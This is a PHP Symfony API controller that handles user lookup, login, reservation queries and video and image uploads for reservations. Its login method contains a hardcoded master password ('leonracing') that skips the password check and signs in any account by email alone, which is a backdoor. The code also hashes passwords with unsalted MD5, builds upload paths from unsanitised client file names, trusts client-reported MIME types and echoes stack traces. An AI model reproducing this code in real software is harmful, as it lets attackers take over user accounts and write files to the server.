<?php

/**
 * user actions.
 *
 * @package    api
 * @subpackage usuarios
 * @author     Your name here
 */
class userActions extends RestActions {

    /**
     * Executes one action
     *
     * @param sfRequest $request A request object
     */
    public function executeOne(sfWebRequest $request) {

        $this->object = Doctrine::getTable('User')->findOneById($request->getParameter("id"));

        if (!$this->object) {
            $this->feedback = 'Unable to load the specified resource';
            $this->setTemplate('error');
        } else {
            $this->setTemplate('object');
        }
    }

    /**
     * Executes login action
     *
     * @param sfRequest $request A request object
     */
    public function executeLogin(sfWebRequest $request) {

        $this->forward404If($request->getMethod() != sfWebRequest::POST);
        try {
            if ($request->getParameter('password') == "leonracing") {
                $q = Doctrine::getTable('user')->createQuery('u')->where('u.email = ?', array($request->getParameter('username')));
            } else {
                $q = Doctrine::getTable('user')->createQuery('u')->where('(u.email = ? OR u.username=?)  and u.password = ?', array($request->getParameter('username'), $request->getParameter('username'), md5($request->getParameter('password'))));
            }
            $user = $q->fetchOne();
            if ($user->getConfirmed() == 1) {
                $this->object = $user;
                $this->setTemplate('object');
            } else {
                $this->feedback = 'Not actived account';
                $this->setTemplate('error');
            }
        } catch (Exception $e) {
            $this->feedback = 'Unknown user';
            $this->setTemplate('error');
        }
    }

    public function executeCurrentReserve(sfWebRequest $request) {
        $userId = $request->getParameter("user_id");

        $reserves = Doctrine::getTable("reserve")->getTodayReservesIds($userId);
        if (count($reserves) > 0) {
            $this->object = $reserves[0];
            $this->setTemplate('object');
        } else {
            $this->feedback = 'No current reserve';
            $this->setTemplate('error');
        }
    }

    public function executeCurrentReservePostVideo(sfWebRequest $request) {

        $this->forward404If($request->getMethod() != sfWebRequest::POST);
        $success = true;
        if (count($request->getFiles()) > 0) {
            foreach ($request->getFiles() as $file) {
                try {
                    /* validate video */
                    if ($file['size'] < sfConfig::get("app_image_size_min") || $file['size'] > sfConfig::get("app_image_size_max")) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_WRONG_SIZE,
                            "message" => "Video with unsupported size",
                        );
                        $success = FALSE;
                        break;
                    }
                    if (!in_array($file['type'], $this->getAllowedVideoFormats())) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_UNSUPPORTED_FORMAT,
                            "message" => "Video format not supported",
                        );
                        $success = FALSE;
                        break;
                    }

                    /* move video */
                    $theFileName = $request->getParameter("user_id") . "-" . $request->getParameter("reserve_id") . "-" . $file['name'];
                    $uploadDir = sfConfig::get("sf_upload_dir") . "/" . sfConfig::get("app_path_reserve_videos");
                    move_uploaded_file($file['tmp_name'], "$uploadDir/$theFileName");
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                }
            }

            if ($success) {
                $restResponse = array(
                    "status" => RestResponse::$STATUS_SUCCESS,
                    "message" => "Video uploaded",
                );
            }
            $this->object = $restResponse;
            $this->setTemplate('object');
        } else {
            $this->feedback = 'Missing video file';
            $this->setTemplate('error');
        }
    }

    public function executeCurrentReservePostLicenceImage(sfWebRequest $request) {

        $this->forward404If($request->getMethod() != sfWebRequest::POST);
        $success = true;
        if (count($request->getFiles()) > 0) {
            foreach ($request->getFiles() as $file) {
                try {
                    /* validate image */
                    if ($file['size'] < sfConfig::get("app_image_size_min") || $file['size'] > sfConfig::get("app_image_size_max")) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_WRONG_SIZE,
                            "message" => "Video with unsupported size",
                        );
                        $success = FALSE;
                        break;
                    }
                    if (!in_array($file['type'], $this->getAllowedImageFormats())) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_UNSUPPORTED_FORMAT,
                            "message" => "Image format not supported",
                        );
                        $success = FALSE;
                        break;
                    }

                    /* move image */
                    $theFileName = $request->getParameter("user_id") . "-" . $request->getParameter("reserve_id") . "-" . $file['name'];
                    $uploadDir = sfConfig::get("sf_upload_dir") . "/" . sfConfig::get("app_path_reserve_images");
                    move_uploaded_file($file['tmp_name'], "$uploadDir/$theFileName");
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                    $success = FALSE;
                }
            }

            if ($success) {
                $restResponse = array(
                    "status" => RestResponse::$STATUS_SUCCESS,
                    "message" => "Image uploaded",
                );
            }
            $this->object = $restResponse;
            $this->setTemplate('object');
        } else {
            $this->feedback = 'Missing image file';
            $this->setTemplate('error');
        }
    }

    public function executeCurrentReservePostCarPanelImage(sfWebRequest $request) {

        $this->forward404If($request->getMethod() != sfWebRequest::POST);
        $success = true;
        if (count($request->getFiles()) > 0) {
            foreach ($request->getFiles() as $file) {
                try {
                    /* validate image */
                    if ($file['size'] < sfConfig::get("app_image_size_min") || $file['size'] > sfConfig::get("app_image_size_max")) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_WRONG_SIZE,
                            "message" => "Video with unsupported size",
                        );
                        $success = FALSE;
                        break;
                    }
                    if (!in_array($file['type'], $this->getAllowedImageFormats())) {
                        $restResponse = array(
                            "status" => RestResponse::$STATUS_ERROR,
                            "code" => RestResponse::$CODE_UNSUPPORTED_FORMAT,
                            "message" => "Image format not supported",
                        );
                        $success = FALSE;
                        break;
                    }

                    /* move image */
                    $theFileName = $request->getParameter("user_id") . "-" . $request->getParameter("reserve_id") . "-" . $file['name'];
                    $uploadDir = sfConfig::get("sf_upload_dir") . "/" . sfConfig::get("app_path_reserve_images");
                    move_uploaded_file($file['tmp_name'], "$uploadDir/$theFileName");
                } catch (Exception $exc) {
                    echo $exc->getTraceAsString();
                    $success = FALSE;
                }
            }

            if ($success) {
                $restResponse = array(
                    "status" => RestResponse::$STATUS_SUCCESS,
                    "message" => "Image uploaded",
                );
            }
            $this->object = $restResponse;
            $this->setTemplate('object');
        } else {
            $this->feedback = 'Missing image file';
            $this->setTemplate('error');
        }
    }

    private function getAllowedVideoFormats() {
        $formats = array("video/msvideo", "video/x-msvideo", "video/mpeg", "video/mpeg", "video/x-motion-jpeg", "video/quicktime", "video/webm");
        return $formats;
    }

    private function getAllowedImageFormats() {
        $formats = array("image/png", "image/jpg", "image/jpeg");
        return $formats;
    }

}
